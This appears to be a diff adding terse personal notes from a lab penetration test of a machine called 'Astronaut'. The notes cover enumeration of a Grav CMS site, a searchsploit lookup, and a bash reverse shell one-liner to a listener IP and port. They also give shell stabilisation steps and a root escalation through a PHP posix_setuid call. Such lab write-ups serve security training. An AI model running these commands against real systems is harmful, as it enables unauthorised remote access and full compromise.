@@ -1,0 +1,21 @@
+Astronaut - Linux Machine 
+
+  - Enumeration :
+    - 22 : SSH 
+    - 80 : HTTP -> Uses Grav CMS 
+
+  - Web app enumeration: 
+    - Looking through, it uses grav CMS 
+    - searchsploit grav cms
+    - come up wth aauthenticated YML Arbitration python file 
+
+  - Execute a reverse shell command using exploit .python
+      - command: /bin/bash -i >& /dev/tcp/192.168.45.211/4444 0>&1
+
+  - Inside the reverse shell:
+      - python3 -c 'import pty;pty.spawn("/bin/bash")'
+      - ctrl z | stty raw -echo && fg 
+      - export TERM=xterm 
+
+  - CMD="/bin/sh"
+  - /usr/bin/php7.4 -r "posix_setuid(0); system('$CMD');"
